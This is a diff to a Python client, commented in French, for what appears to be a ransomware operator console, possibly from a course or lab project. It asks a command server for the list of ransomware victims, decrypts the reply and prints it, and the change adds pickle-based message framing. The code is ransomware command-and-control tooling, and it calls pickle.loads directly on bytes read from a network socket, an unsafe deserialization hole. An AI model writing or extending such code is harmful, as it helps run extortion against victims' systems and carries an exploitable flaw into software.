@@ -9,6 +9,7 @@ import socket
 from utile import security
 import utile.configgetter as config
 from utile import message
+import pickle
 import binascii
 
 
@@ -43,9 +44,13 @@ def main():
             # On demande au serveur frontale de lister les victimes
             # Lui va interroger la DB Sqlite
             d = message.list_victim_req()
-            s.send(bytes(d, 'utf-8'))
+            #s.send(d.encode('utf-8'))
+            create_header(s, 10, d)
             # On récupère la réponse en écoutant
-            data = s.recv(8192)
+            size = pickle.loads(s.recv(10))
+            print(size)
+            data = pickle.loads(s.recv(size))
+            print(data)
             data_e = security.decrypt(data, key)
             print('LISTING DES VICTIMES DU RANSOMWARE\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
             print(data_e)
@@ -78,6 +83,17 @@ def main():
             # On break et la connexion se ferme en sortant du break
             break
     s.close()
+
+
+def create_header(c, HEADER_SIZE, message):
+    """
+    Créer un header pour la connexion TCP afin de savoir de où à où lire
+    """
+    message_bytes = message.encode()
+    message_length = len(message_bytes)
+    header = pickle.dumps(f'{message_length:<{HEADER_SIZE}}')  # en-tête de 10 bytes
+    c.sendall(header)
+    c.sendall(message_bytes)
 
 
 def fill_payload():
